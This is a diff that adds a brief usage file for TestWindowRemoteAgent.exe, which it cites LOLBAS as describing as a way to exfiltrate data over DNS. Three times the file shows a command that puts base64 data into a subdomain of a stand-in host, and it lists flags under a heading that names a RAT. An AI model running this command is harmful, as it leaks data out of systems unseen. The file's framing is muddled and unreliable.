@@ -1,0 +1,17 @@
+ABOUT
+    TestWindowRemoteAgent.exe is the command-line tool to establish RPC.
+    LOLBAS documents attackers may utilize this to exfiltrate data over
+    DNS.
+
+USAGE:
+    TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
+
+EXAMPLES:
+    TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
